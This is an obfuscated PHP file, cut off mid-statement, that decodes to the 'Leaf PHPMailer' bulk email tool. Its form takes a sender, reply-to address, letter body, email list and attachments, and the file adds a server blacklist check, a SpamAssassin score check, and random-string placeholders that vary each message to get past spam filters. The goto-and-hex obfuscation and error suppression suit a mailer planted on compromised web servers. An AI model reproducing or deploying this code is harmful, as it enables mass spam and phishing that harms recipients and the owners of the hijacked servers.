<?php
 goto UFd1d; El7pY: session_write_close(); goto CLTY6; qMpS2: error_reporting(0); goto zfjal; IXPAg: $html = "\x63\x68\x65\143\x6b\145\144"; goto uKHYM; QYeTX: $bit8 = "\x73\145\x6c\145\143\164\145\144"; goto X4tkO; wdebV: print "\x3c\144\x69\x76\40\143\154\141\163\x73\x3d\x22\143\157\x6e\164\141\151\x6e\x65\x72\40\143\x6f\x6c\x2d\x6c\x67\x2d\x36\42\x3e\xa\x20\x20\40\x20\40\40\x20\x20\x3c\x68\x33\76\x3c\x66\157\156\x74\x20\x63\x6f\154\157\162\x3d\42\147\162\145\x65\156\42\76\74\x73\x70\141\156\x20\x63\154\141\163\x73\x3d\42\x67\154\171\x70\x68\151\x63\157\x6e\40\147\x6c\x79\160\150\151\x63\x6f\156\55\154\145\141\x66\42\76\x3c\57\163\x70\x61\156\76\74\x2f\x66\157\156\164\x3e\x20\x4c\x65\141\146\40\120\x48\120\115\141\x69\154\145\162\x20\x3c\163\x6d\x61\154\154\76" . $leaf["\x76\x65\162\x73\151\x6f\156"] . "\74\x2f\x73\155\141\154\x6c\x3e\x3c\57\150\x33\76\xa\x20\40\40\x20\40\40\x20\x20\x3c\x66\157\x72\x6d\x20\156\x61\155\145\x3d\x22\146\x6f\162\x6d\x22\x20\151\144\75\x22\x66\157\x72\155\x22\x20\x6d\145\164\150\157\144\x3d\42\120\117\123\x54\42\40\145\156\x63\164\171\160\x65\x3d\42\x6d\x75\154\164\x69\x70\x61\162\x74\57\146\x6f\162\x6d\55\x64\141\164\x61\42\x20\x61\x63\x74\151\x6f\x6e\75\x22\42\x3e\xa\x20\40\40\40\40\40\x20\40\x20\40\x20\40\40\x20\x20\40\x20\40\x20\x20\74\151\156\x70\165\164\40\x74\x79\x70\x65\x3d\x22\150\151\x64\x64\145\156\42\x20\x6e\141\155\145\75\x22\141\x63\x74\151\157\x6e\x22\x20\166\x61\154\165\x65\x3d\x22\x73\143\157\162\145\x22\76\xa\12\x20\40\40\40\40\40\40\40\x20\x20\x20\40\74\144\x69\166\x20\143\x6c\141\163\x73\75\x22\162\x6f\167\x22\x3e\xa\x20\40\40\40\40\40\x20\40\40\40\40\40\x20\x20\x20\40\x3c\x64\151\166\x20\143\154\x61\163\x73\x3d\x22\146\157\x72\x6d\x2d\147\x72\x6f\165\x70\40\x63\x6f\154\x2d\154\x67\x2d\x36\x20\42\x3e\x3c\154\141\x62\x65\x6c\40\146\x6f\x72\x3d\42\163\145\x6e\144\145\x72\x45\155\x61\x69\154\x22\76\105\155\141\151\154\74\x2f\x6c\x61\142\x65\x6c\76\x3c\151\156\x70\165\164\40\x74\171\160\145\75\x22\x74\x65\170\164\42\40\x63\x6c\x61\x73\x73\75\42\x66\157\162\x6d\55\x63\x6f\x6e\164\x72\x6f\x6c\x20\40\x69\156\x70\165\x74\x2d\163\155\40\42\40\151\144\x3d\x22\x73\x65\x6e\144\x65\x72\105\x6d\141\x69\x6c\42\x20\x6e\141\x6d\x65\75\42\x73\145\156\144\145\162\x45\155\141\x69\154\42\40\x76\141\154\165\145\75\x22" . $senderEmail . "\42\76\x3c\57\144\x69\x76\76\xa\x20\40\x20\40\40\x20\x20\40\x20\x20\40\x20\x20\x20\x20\40\x3c\144\151\x76\40\x63\x6c\141\163\163\75\x22\x66\x6f\162\x6d\x2d\147\162\157\x75\160\40\x63\157\154\x2d\x6c\x67\55\x36\x20\42\76\x3c\154\141\142\x65\154\40\146\x6f\162\75\x22\x73\x65\x6e\x64\x65\162\116\x61\x6d\145\42\x3e\x53\x65\x6e\144\145\162\40\116\x61\x6d\x65\x3c\57\x6c\141\142\145\x6c\76\74\x69\156\x70\x75\164\40\164\171\160\145\x3d\x22\164\145\170\164\x22\40\x63\x6c\x61\x73\x73\x3d\x22\x66\157\x72\155\55\143\x6f\156\164\x72\x6f\x6c\40\x20\x69\x6e\160\165\x74\55\x73\155\x20\x22\40\x69\x64\x3d\x22\x73\x65\x6e\x64\145\x72\x4e\141\155\x65\42\40\x6e\141\x6d\145\x3d\42\x73\145\156\x64\x65\x72\x4e\x61\155\x65\x22\40\166\x61\x6c\x75\145\75\x22" . $senderName . "\x22\x3e\x3c\x2f\144\151\x76\76\12\40\40\x20\x20\x20\40\x20\40\40\40\x20\40\x3c\x2f\144\x69\x76\76\12\x20\40\x20\x20\x20\40\x20\40\x20\x20\40\40\74\x64\x69\x76\x20\143\x6c\x61\x73\163\75\x22\x72\157\x77\42\76\xa\40\40\x20\40\x20\x20\x20\40\40\x20\x20\x20\x20\x20\x20\x20\x3c\x73\x70\141\x6e\x20\143\x6c\141\x73\163\75\x22\146\157\162\155\x2d\147\162\157\x75\x70\40\x63\x6f\x6c\55\x6c\147\x2d\x36\40\40\42\x3e\74\x6c\141\142\145\154\x20\x66\x6f\x72\x3d\42\x61\x74\164\x61\143\x68\155\x65\156\x74\x22\x3e\101\x74\x74\x61\143\x68\x6d\x65\x6e\x74\x20\x3c\163\155\x61\x6c\x6c\x3e\50\x4d\165\x6c\164\151\x70\x6c\x65\40\101\x76\x61\151\154\x61\142\154\x65\51\74\57\x73\155\x61\154\154\76\x3c\x2f\x6c\141\x62\x65\154\76\x3c\151\x6e\160\165\164\x20\164\171\x70\x65\75\42\x66\x69\154\145\42\x20\x6e\x61\x6d\x65\75\42\x61\164\x74\x61\143\x68\x6d\145\156\164\133\x5d\42\40\x69\144\75\x22\x61\164\x74\x61\x63\150\155\145\156\x74\133\x5d\x22\x20\x6d\x75\154\164\151\160\154\145\57\x3e\74\x2f\x73\160\x61\x6e\76\12\12\40\x20\x20\x20\x20\40\x20\x20\40\40\x20\x20\40\40\40\x20\74\144\151\166\x20\143\x6c\x61\x73\163\75\42\146\157\162\155\x2d\x67\x72\157\165\160\x20\143\x6f\154\55\x6c\x67\x2d\x36\42\76\x3c\154\x61\x62\145\154\x20\x66\157\162\x3d\42\x72\x65\x70\154\x79\124\x6f\42\76\122\x65\x70\x6c\x79\55\x74\x6f\x3c\57\154\141\142\145\154\76\x3c\151\x6e\x70\165\164\x20\164\x79\x70\145\75\42\164\x65\170\x74\42\40\x63\154\x61\x73\163\x3d\x22\x66\x6f\x72\155\55\143\x6f\x6e\164\x72\x6f\154\x20\x20\151\x6e\160\165\x74\x2d\x73\x6d\40\42\x20\x69\144\x3d\42\162\145\160\154\171\124\157\x22\40\x6e\x61\x6d\145\75\42\x72\x65\160\154\x79\x54\157\42\40\166\x61\154\x75\x65\x3d\42" . $replyTo . "\x22\40\57\76\74\x2f\144\x69\166\76\xa\40\x20\x20\40\x20\40\x20\40\x20\40\40\40\x3c\57\x64\151\x76\76\xa\40\40\40\x20\x20\x20\40\x20\40\40\x20\x20\x3c\x64\151\166\x20\143\x6c\x61\x73\163\x3d\42\x72\x6f\x77\42\76\12\40\x20\x20\40\40\40\x20\40\x20\x20\x20\40\x20\40\40\x20\x3c\x64\151\166\x20\x63\x6c\x61\x73\163\x3d\x22\x66\x6f\x72\x6d\x2d\x67\x72\157\x75\x70\x20\143\x6f\154\55\x6c\147\x2d\x31\62\40\x22\x3e\x3c\154\x61\142\x65\154\x20\x66\x6f\x72\75\42\163\x75\x62\152\145\x63\164\42\x3e\123\165\142\152\145\143\x74\x3c\57\154\x61\x62\x65\154\x3e\74\x69\x6e\160\165\164\40\164\171\160\145\75\x22\164\x65\x78\164\42\40\143\154\141\x73\163\75\42\146\157\x72\x6d\55\x63\157\x6e\x74\162\157\x6c\40\x20\x69\156\x70\165\164\55\163\x6d\x20\x22\40\x69\x64\75\42\x73\165\x62\x6a\x65\143\164\42\40\x6e\x61\155\145\x3d\42\x73\x75\x62\x6a\x65\x63\164\42\x20\166\141\x6c\x75\x65\x3d\x22" . $subject . "\x22\x20\57\x3e\74\x2f\144\x69\x76\x3e\12\40\40\x20\40\40\x20\x20\x20\x20\40\x20\40\74\57\x64\x69\166\x3e\xa\40\x20\40\40\x20\40\40\40\40\40\x20\40\74\144\x69\x76\40\x63\154\141\x73\x73\x3d\42\162\157\167\x22\x3e\xa\40\x20\40\x20\x20\40\x20\40\40\40\40\x20\x20\40\40\x20\x3c\144\x69\166\40\x63\154\141\x73\x73\75\x22\x66\x6f\162\155\x2d\x67\x72\x6f\x75\160\40\143\157\154\55\x6c\147\x2d\66\42\76\74\154\x61\142\x65\x6c\40\146\x6f\162\x3d\x22\x6d\x65\163\163\x61\147\145\x4c\145\x74\x74\x65\x72\x22\76\x4d\145\163\163\141\147\x65\x20\x4c\145\164\164\x65\x72\x20\x3c\142\165\x74\164\157\156\x20\x74\x79\160\145\x3d\42\163\165\142\155\151\x74\x22\x20\x63\154\141\x73\x73\75\42\142\164\156\x20\142\164\x6e\x2d\x64\145\x66\x61\x75\x6c\x74\40\x62\164\x6e\55\170\x73\x22\40\146\157\x72\155\75\42\146\157\x72\x6d\42\40\156\141\x6d\x65\75\42\x61\x63\164\x69\157\x6e\42\40\166\x61\x6c\165\145\75\x22\x76\151\x65\x77\42\40\146\x6f\162\x6d\x74\141\162\x67\145\x74\75\x22\137\142\x6c\x61\x6e\153\x22\x3e\120\162\145\x76\151\x65\167\x20\74\x2f\x62\165\x74\x74\157\x6e\76\74\x2f\x6c\x61\x62\145\154\76\x3c\164\x65\x78\x74\x61\x72\145\141\40\x6e\141\x6d\x65\x3d\x22\x6d\x65\x73\163\x61\x67\145\x4c\145\x74\x74\x65\162\x22\x20\151\144\x3d\x22\155\x65\163\x73\x61\x67\145\x4c\145\x74\x74\x65\162\42\40\x63\x6c\x61\x73\163\x3d\x22\146\x6f\162\x6d\55\x63\x6f\156\164\x72\x6f\x6c\x22\40\x72\157\x77\x73\x3d\x22\x31\60\x22\x20\151\x64\75\42\x74\x65\170\164\101\x72\x65\141\x22\x3e" . $messageLetter . "\74\x2f\x74\x65\170\x74\141\x72\145\x61\x3e\x3c\x2f\x64\x69\x76\76\xa\40\x20\40\40\x20\40\x20\40\x20\x20\x20\40\40\x20\40\40\74\x64\x69\x76\x20\x63\x6c\x61\163\163\75\42\146\157\162\x6d\55\x67\162\157\x75\160\40\x63\157\x6c\x2d\154\147\x2d\x36\x20\x22\76\x3c\x6c\x61\x62\145\x6c\40\x66\157\162\75\42\145\155\141\151\154\x4c\151\x73\x74\x22\76\x45\x6d\141\x69\x6c\x20\114\151\163\x74\40\74\141\x20\x68\162\x65\146\x3d\x22\77\x65\x6d\141\151\x6c\146\x69\x6c\x74\145\162\x3d\157\156\42\40\164\x61\162\147\x65\x74\x3d\x22\x5f\142\154\141\x6e\x6b\x22\x20\143\154\141\163\163\x3d\42\142\x74\x6e\40\x62\164\156\x2d\x64\x65\x66\x61\165\154\x74\40\x62\164\x6e\x2d\170\163\42\76\106\151\x6c\164\x65\162\57\105\x78\164\x72\141\143\x74\74\x2f\141\76\x3c\x2f\x6c\x61\142\145\x6c\76\x3c\x74\145\170\x74\x61\x72\145\x61\x20\156\141\155\x65\x3d\x22\x65\155\141\151\x6c\x4c\x69\x73\164\x22\x20\x69\144\75\42\x65\x6d\x61\x69\x6c\114\x69\x73\164\x22\40\x63\x6c\141\163\163\75\x22\146\x6f\x72\155\55\143\157\156\x74\x72\x6f\154\42\40\162\157\x77\x73\75\x22\61\x30\x22\x20\151\144\75\x22\x74\145\170\x74\101\x72\x65\x61\42\x3e" . $emailList . "\x3c\x2f\164\145\170\164\141\162\x65\x61\x3e\x3c\x2f\144\x69\x76\76\xa\x20\40\x20\40\40\x20\x20\x20\x20\x20\x20\x20\74\57\144\x69\166\76\12\40\40\40\x20\40\x20\40\x20\40\x20\x20\40\74\x64\151\x76\40\143\x6c\141\x73\163\x3d\x22\162\157\x77\x22\76\12\40\x20\40\40\x20\40\x20\x20\x20\x20\x20\40\x20\x20\x20\x20\74\144\x69\166\x20\143\x6c\x61\x73\163\x3d\x22\146\157\x72\x6d\55\x67\x72\x6f\x75\160\x20\x63\157\x6c\55\154\147\55\66\40\42\76\12\x20\x20\40\x20\x20\x20\x20\40\40\x20\40\40\x20\40\40\40\x20\x20\x20\40\74\154\x61\x62\145\154\40\146\x6f\162\75\x22\x6d\145\x73\x73\x61\147\x65\124\171\160\145\42\x3e\x4d\x65\x73\x73\x61\147\x65\40\x54\171\160\145\x3c\57\x6c\141\142\145\154\76\12\x20\x20\x20\40\40\x20\x20\x20\x20\x20\40\40\40\40\x20\x20\40\40\40\x20\110\x54\115\114\x20\74\151\x6e\x70\x75\164\x20\164\x79\160\145\75\x22\162\141\x64\x69\x6f\42\x20\x6e\x61\x6d\145\75\x22\x6d\x65\x73\163\141\x67\145\x54\171\160\x65\x22\40\x69\144\x3d\x22\155\x65\x73\163\141\147\x65\x54\171\x70\145\x22\40\166\141\x6c\x75\x65\x3d\42\61\42\40" . $html . "\76\xa\40\40\40\40\x20\x20\x20\x20\40\40\x20\40\x20\x20\x20\x20\x20\40\x20\40\120\x6c\x61\151\156\x3c\151\156\160\165\x74\40\x74\x79\x70\145\x3d\x22\x72\x61\x64\x69\157\x22\40\x6e\141\x6d\145\x3d\42\155\145\x73\163\141\x67\x65\124\x79\x70\145\42\x20\151\x64\x3d\x22\x6d\145\163\x73\x61\x67\145\x54\x79\160\145\x22\x20\166\x61\154\165\145\x3d\x22\62\x22\x20" . $plain . "\x3e\xa\40\40\x20\40\x20\x20\x20\40\x20\x20\40\x20\x20\x20\x20\40\x3c\x2f\x64\x69\166\76\12\40\40\x20\x20\x20\40\40\x20\x20\40\x20\40\40\x20\40\x20\x3c\x64\x69\166\40\x63\x6c\x61\163\163\75\42\x66\157\x72\155\55\x67\x72\157\165\160\40\x63\x6f\x6c\55\154\147\55\63\x20\42\x3e\12\x20\40\40\x20\40\x20\40\40\x20\40\x20\40\40\40\x20\x20\x20\x20\40\40\x3c\x6c\x61\142\145\x6c\40\x66\157\x72\x3d\42\143\x68\x61\x72\163\145\x74\x22\76\103\x68\x61\162\x61\x63\164\x65\162\x20\163\145\164\74\57\x6c\141\142\x65\154\76\xa\40\x20\x20\40\x20\x20\40\40\x20\40\x20\40\x20\x20\40\x20\40\40\40\40\74\163\x65\154\145\143\x74\x20\x63\154\141\x73\x73\x3d\x22\x66\157\162\155\x2d\x63\157\156\x74\x72\x6f\x6c\x20\151\156\x70\x75\x74\55\x73\x6d\x22\x20\151\144\75\x22\x63\x68\141\162\x73\145\164\42\40\x6e\141\155\145\75\x22\143\x68\x61\x72\163\x65\164\42\x3e\12\40\x20\40\x20\x20\40\x20\40\x20\x20\x20\40\40\40\40\40\x20\40\40\40\x20\x20\40\40\x3c\157\x70\x74\x69\x6f\x6e\40" . $utf8 . "\76\125\x54\106\55\70\x3c\57\157\160\164\151\x6f\x6e\76\xa\x20\40\40\40\x20\40\x20\40\40\40\40\40\40\x20\x20\x20\x20\40\x20\40\40\40\x20\x20\x3c\157\160\164\x69\157\x6e\40" . $iso . "\x3e\111\x53\x4f\55\70\x38\x35\71\x2d\61\x3c\x2f\x6f\160\x74\151\x6f\156\76\xa\x20\40\x20\x20\40\40\40\x20\x20\40\x20\40\x20\x20\x20\40\x20\x20\40\x20\x3c\57\163\145\154\x65\x63\x74\x3e\xa\x20\x20\40\40\x20\40\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\x3c\x2f\x64\151\166\x3e\xa\x20\40\40\40\x20\40\40\40\40\40\x20\40\x20\40\x20\40\x3c\144\151\166\40\x63\154\141\163\x73\75\42\x66\157\x72\155\55\147\x72\x6f\165\160\40\x63\x6f\x6c\55\154\x67\55\63\x20\42\x3e\12\x20\x20\x20\40\40\40\x20\40\x20\x20\40\40\x20\x20\x20\x20\40\x20\x20\x20\74\154\141\142\x65\x6c\40\146\x6f\162\75\42\x65\156\x63\x6f\144\151\156\x67\42\x3e\115\145\163\x73\x61\x67\145\40\145\156\x63\x6f\x64\x69\x6e\147\74\x2f\x6c\141\x62\x65\x6c\76\12\40\40\40\x20\40\x20\x20\x20\40\x20\40\x20\40\40\x20\40\x20\40\x20\40\74\163\x65\x6c\145\x63\x74\40\x63\154\x61\x73\163\x3d\42\146\157\162\155\x2d\143\x6f\156\x74\x72\x6f\154\x20\151\156\x70\165\164\x2d\x73\x6d\42\40\x69\144\75\42\x65\x6e\x63\x6f\144\145\42\40\x6e\141\155\145\75\x22\145\x6e\x63\x6f\x64\x65\42\x3e\12\40\x20\x20\40\40\x20\x20\40\40\x20\40\x20\40\40\40\40\x20\x20\x20\x20\x20\40\x20\x20\x3c\157\160\164\151\x6f\156\40" . $bit8 . "\x3e\70\142\151\164\74\x2f\x6f\x70\164\x69\x6f\x6e\x3e\xa\x20\40\40\40\40\x20\x20\x20\40\x20\x20\x20\40\x20\40\40\x20\x20\40\40\x20\40\x20\x20\x3c\x6f\x70\164\151\x6f\156\40" . $bit7 . "\76\67\142\x69\164\x3c\57\157\x70\x74\x69\157\x6e\x3e\12\x20\40\x20\x20\40\40\x20\40\x20\x20\40\40\40\40\x20\40\40\40\x20\x20\40\x20\40\40\74\x6f\160\164\x69\157\x6e\40" . $binary . "\76\x62\x69\156\x61\x72\x79\x3c\x2f\x6f\160\164\x69\157\156\76\12\40\x20\40\40\x20\x20\40\40\40\x20\x20\x20\x20\x20\40\x20\x20\40\40\40\40\x20\x20\x20\74\x6f\x70\164\151\x6f\x6e\40" . $base64 . "\76\x62\x61\x73\145\66\x34\74\x2f\157\160\164\x69\157\x6e\x3e\12\x20\x20\x20\40\40\x20\x20\40\40\40\40\40\x20\x20\40\40\40\40\x20\x20\x20\x20\x20\x20\74\157\160\x74\x69\157\x6e\x20" . $quotedprintable . "\x3e\161\165\x6f\164\x65\144\55\160\162\151\156\164\141\142\x6c\145\74\57\157\x70\x74\x69\157\156\76\xa\xa\40\x20\x20\x20\40\x20\40\40\40\x20\x20\x20\x20\x20\40\40\x20\x20\x20\x20\x3c\57\x73\x65\154\145\143\164\76\xa\40\x20\40\40\x20\40\40\40\40\40\40\x20\x20\40\x20\x20\x3c\57\144\151\166\x3e\xa\40\40\40\x20\40\x20\40\x20\x20\40\x20\40\74\x2f\x64\151\x76\76\12\x20\40\40\40\x20\x20\40\40\x20\40\40\40\74\142\165\164\x74\157\156\x20\x74\x79\x70\145\x3d\42\x73\x75\142\155\x69\x74\42\x20\x63\154\x61\x73\x73\x3d\x22\142\x74\156\x20\142\164\156\x2d\144\x65\x66\141\165\x6c\x74\x20\142\x74\x6e\55\x73\x6d\42\x20\x66\157\x72\x6d\x3d\42\x66\157\162\x6d\x22\x20\x6e\x61\x6d\x65\75\x22\x61\143\x74\x69\157\156\x22\40\166\x61\154\165\x65\x3d\42\163\x65\x6e\144\x22\76\x53\105\116\x44\74\x2f\x62\165\164\x74\157\x6e\x3e\40\x6f\x72\x20\74\x61\40\150\x72\145\x66\75\42\43\42\x20\x6f\156\143\x6c\x69\x63\x6b\75\42\x64\157\143\165\x6d\x65\156\164\x2e\x67\x65\x74\105\154\x65\155\x65\x6e\164\102\x79\111\144\50\47\x66\x6f\x72\155\x27\x29\x2e\163\165\142\x6d\x69\x74\50\51\x3b\40\162\145\x74\165\x72\x6e\x20\146\x61\x6c\x73\145\x3b\x22\x3e\143\x68\x65\143\x6b\x20\x53\x70\x61\155\101\x73\x73\x61\x73\163\151\156\40\x53\143\x6f\162\x65\74\x2f\x61\76\xa\x20\x20\x20\12\40\x20\40\x20\x20\x20\40\40\74\x2f\x66\x6f\162\155\x3e\xa\x20\40\x20\40\74\57\x64\151\x76\76\xa\40\x20\x20\40\x3c\x64\x69\x76\x20\143\x6c\141\x73\163\75\42\143\157\154\x2d\154\147\x2d\x36\42\x3e\x3c\x62\162\76\xa\40\x20\40\40\x20\x20\x20\x20\74\x6c\x61\x62\145\154\40\146\x6f\162\x3d\x22\167\145\154\x6c\x22\x3e\x49\x6e\163\164\162\x75\143\164\x69\157\x6e\74\x2f\x6c\141\142\x65\x6c\76\xa\40\x20\x20\40\x20\40\x20\x20\74\144\151\x76\40\151\x64\x3d\42\167\145\x6c\x6c\x22\x20\x63\154\141\x73\163\75\x22\x77\x65\x6c\x6c\40\167\x65\154\154\42\76\xa\x20\x20\x20\40\x20\x20\x20\40\x20\40\40\x20\74\x68\64\76\x53\145\162\166\145\162\x20\x49\156\x66\157\162\x6d\141\x74\x69\x6f\x6e\x3c\x2f\150\64\76\12\x20\40\40\x20\40\40\x20\x20\40\x20\x20\40\74\165\x6c\76\12\40\40\40\x20\x20\40\40\40\40\x20\x20\40\x20\40\40\40\74\x6c\151\x3e\123\x65\x72\166\x65\162\40\x49\x50\x20\101\144\x64\x72\x65\163\163\40\72\40\x3c\142\76" . $_SERVER["\x53\105\122\x56\x45\x52\x5f\x41\x44\x44\122"] . "\40\x3c\x2f\x62\76\40\74\x61\x20\x68\162\x65\x66\75\x22\77\x63\x68\x65\143\153\137\151\x70\75" . $_SERVER["\123\105\122\x56\105\x52\137\101\104\x44\x52"] . "\x22\x20\164\141\162\147\x65\164\75\x22\x5f\x62\154\141\156\x6b\x22\40\x63\x6c\141\x73\163\75\42\x6c\141\x62\x65\x6c\40\154\141\142\x65\154\x2d\160\162\151\155\x61\x72\171\42\76\x43\150\x65\143\153\x20\x42\154\x61\143\153\x6c\x69\x73\x74\x20\x3c\x69\40\143\154\141\163\163\x3d\42\147\x6c\171\x70\150\x69\x63\x6f\156\40\x67\x6c\x79\x70\150\151\x63\157\156\x2d\163\145\x61\162\143\150\42\x3e\x3c\57\151\x3e\74\x2f\x61\76\74\57\154\x69\x3e\12\40\x20\x20\40\40\x20\40\40\40\40\40\40\40\x20\40\40\74\x6c\x69\76\x50\110\120\40\x56\145\x72\x73\x69\157\x6e\x20\x3a\40\x3c\142\x3e" . phpversion() . "\x3c\57\x62\76\74\x2f\154\151\x3e\xa\40\x20\40\x20\x20\x20\40\40\40\x20\x20\40\40\40\40\40\12\xa\x20\x20\x20\x20\40\40\x20\40\40\40\40\40\74\x2f\165\154\76\xa\40\x20\40\x20\40\40\40\x20\40\40\x20\x20\x3c\150\64\x3e\110\105\114\x50\x3c\57\150\64\76\xa\x20\40\x20\40\x20\x20\x20\x20\40\x20\40\40\74\x75\x6c\x3e\12\40\x20\x20\x20\40\x20\40\40\x20\x20\x20\x20\40\x20\x20\x20\74\x6c\151\76\133\x2d\145\155\141\151\x6c\55\x5d\x20\72\x20\x3c\142\76\122\145\x63\x69\166\x65\162\40\105\x6d\x61\x69\154\x3c\57\142\x3e\x20\x28\145\x6d\141\151\154\165\163\x65\x72\100\145\155\x61\x69\154\x64\157\x6d\x61\x69\x6e\56\x63\x6f\155\51\x3c\57\x6c\x69\76\xa\x20\40\x20\40\40\x20\x20\x20\40\40\40\x20\40\40\x20\x20\x3c\x75\x6c\x3e\xa\x20\40\40\40\40\40\x20\x20\40\x20\x20\x20\40\40\40\x20\40\x20\x20\x20\74\x6c\x69\x3e\133\x2d\145\155\141\x69\x6c\x75\x73\145\x72\55\135\x20\x3a\x20\x3c\142\x3e\x45\155\141\151\x6c\x20\125\x73\x65\162\74\57\142\x3e\x20\50\145\155\141\151\x6c\x75\163\145\x72\51\x20\74\57\x6c\151\x3e\12\40\x20\x20\40\x20\40\x20\40\x20\40\40\40\x20\x20\40\40\40\40\40\x20\74\154\151\76\133\55\x65\x6d\x61\x69\x6c\144\157\155\141\x69\x6e\x2d\x5d\x20\x3a\40\x3c\x62\76\x45\x6d\x61\151\x6c\x20\x55\x73\x65\x72\74\x2f\x62\76\40\50\145\x6d\141\x69\x6c\x64\x6f\155\x61\x69\x6e\x2e\143\157\155\x29\x20\74\57\154\151\x3e\12\40\x20\40\40\40\x20\x20\40\x20\x20\40\x20\x20\40\40\x20\x3c\57\x75\154\76\12\40\40\x20\40\40\40\x20\x20\x20\x20\40\x20\40\40\x20\x20\x3c\154\151\x3e\133\55\x74\151\x6d\x65\x2d\x5d\x20\72\40\x3c\142\76\104\141\164\145\x20\x61\x6e\144\x20\x54\151\155\x65\x3c\x2f\142\76\x20\50" . date("\x6d\x2f\x64\x2f\131\40\150\x3a\151\x3a\163\x20\141", time()) . "\x29\x3c\x2f\x6c\151\76\12\x20\40\40\x20\x20\x20\40\40\40\x20\x20\40\x20\40\x20\40\12\40\x20\x20\40\x20\x20\40\x20\x20\x20\40\40\x20\40\40\x20\x3c\x6c\x69\76\133\x2d\x72\x61\156\144\157\x6d\163\164\162\151\156\x67\x2d\x5d\x20\x3a\40\74\142\76\122\141\x6e\x64\x6f\155\x20\163\164\x72\x69\x6e\x67\x20\50\60\55\71\x2c\x61\55\x7a\51\74\x2f\142\x3e\74\57\154\x69\x3e\xa\40\40\40\40\x20\40\40\40\x20\40\x20\40\40\40\40\x20\74\154\x69\x3e\133\55\162\x61\x6e\x64\x6f\155\156\165\155\x62\145\162\x2d\135\x20\x3a\x20\x3c\x62\76\x52\141\156\144\157\x6d\40\x6e\165\155\x62\145\162\40\50\60\x2d\x39\x29\x20\x3c\57\142\x3e\x3c\57\x6c\151\x3e\12\x20\40\x20\40\40\40\40\x20\x20\x20\40\40\x20\40\40\40\x3c\154\x69\x3e\133\x2d\162\141\x6e\144\157\x6d\154\145\164\x74\x65\x72\163\x2d\135\40\x3a\x20\x3c\142\76\x52\x61\156\x64\x6f\x6d\40\114\145\x74\x74\x65\x72\x73\x28\141\x2d\x7a\x29\40\74\57\142\x3e\74\57\154\151\76\xa\x20\40\x20\x20\40\40\x20\x20\x20\x20\x20\x20\x20\40\40\x20\74\x6c\x69\76\x5b\x2d\162\141\x6e\144\x6f\155\x6d\x64\65\x2d\135\x20\x3a\x20\74\x62\76\122\141\156\144\x6f\155\x20\115\x44\x35\x20\x3c\57\x62\x3e\74\x2f\154\151\76\12\x20\x20\x20\40\x20\x20\x20\40\x20\x20\x20\x20\74\x2f\165\x6c\x3e\12\x20\x20\40\x20\40\x20\40\40\40\40\40\x20\x3c\150\64\76\145\x78\141\155\160\x6c\145\x3c\57\150\64\76\12\40\40\x20\x20\x20\40\x20\x20\x20\x20\40\40\x52\145\143\x65\x69\x76\145\x72\x20\x45\155\141\151\x6c\x20\x3d\x20\x3c\x62\76\x75\163\x65\x72\100\144\157\155\141\x69\156\56\x63\x6f\x6d\x3c\x2f\142\76\74\x62\162\76\xa\x20\x20\x20\40\40\x20\40\x20\x20\40\x20\x20\x3c\165\154\76\xa\40\x20\x20\x20\x20\x20\40\40\40\40\x20\40\40\40\x20\40\74\x6c\151\76\150\x65\154\154\157\x20\x3c\142\76\x5b\x2d\145\155\141\151\x6c\165\163\145\x72\55\135\x3c\57\142\76\40\x3d\x20\x68\145\x6c\154\x6f\40\74\142\x3e\165\x73\145\x72\x3c\x2f\x62\76\x3c\x2f\154\151\x3e\12\40\40\40\40\40\40\40\40\x20\40\x20\40\x20\x20\x20\x20\74\154\151\x3e\171\x6f\165\162\40\144\x6f\155\141\x69\156\40\151\163\40\74\142\76\x5b\x2d\145\x6d\x61\x69\154\x64\x6f\155\141\151\x6e\x2d\x5d\x3c\x2f\x62\x3e\x20\x3d\40\131\x6f\x75\x72\x20\x44\x6f\155\141\x69\156\40\151\163\x20\74\x62\76\x64\x6f\x6d\x61\x69\156\56\143\x6f\155\x3c\x2f\x62\76\x3c\x2f\154\151\x3e\12\40\x20\40\x20\x20\x20\x20\x20\40\x20\x20\x20\40\x20\40\x20\x3c\154\151\76\171\x6f\x75\x72\x20\x63\157\144\145\40\151\x73\x20\x20\x3c\142\76\x5b\55\162\141\x6e\144\157\155\x6d\144\x35\55\135\74\x2f\x62\x3e\40\75\x20\x79\157\x75\x72\40\143\157\144\x65\40\151\163\x20\74\142\76\x65\61\x30\141\x64\x63\63\x39\x34\x39\x62\141\x35\x39\x61\142\x62\x65\65\66\145\x30\x35\67\x66\62\60\146\70\70\x33\145\74\x2f\142\76\x3c\x2f\x6c\x69\76\12\x20\x20\40\40\x20\40\40\40\40\40\40\x20\x3c\x2f\x75\154\x3e\xa\xa\40\x20\x20\x20\x20\40\x20\40\40\x20\x20\40\x3c\150\x36\76\x62\x79\40\74\x62\x3e\x3c\x61\40\150\x72\145\146\75\x22\x68\164\x74\x70\72\x2f\57" . $leaf["\167\x65\142\163\x69\164\145"] . "\x22\x3e" . $leaf["\x77\x65\142\x73\x69\164\145"] . "\x3c\57\x61\x3e\74\57\x62\x3e\x3c\x2f\x68\x36\x3e\12\40\40\x20\40\40\40\40\40\74\x2f\144\x69\x76\x3e\12\40\40\40\x20\74\57\x64\x69\x76\x3e"; goto nktzT; oPAQM: function leafMailCheck($email) { if (filter_var($email, FILTER_VALIDATE_EMAIL)) { return true; } else { return false; } } goto fHogs; kK2dj: @header("\156\x75\x6c\x6c\67\x37\x3a\x20\160\117\151\x6e\164\145\162"); goto UbFXB; rvCyc: leafheader(); goto v_PtG; FjfTp: function leafheader() { print "\xa\74\150\145\141\144\x3e\12\x20\40\40\40\x3c\x74\x69\x74\154\145\x3e" . str_replace("\x77\167\167\x2e", '', $_SERVER["\x48\124\x54\x50\137\x48\117\123\x54"]) . 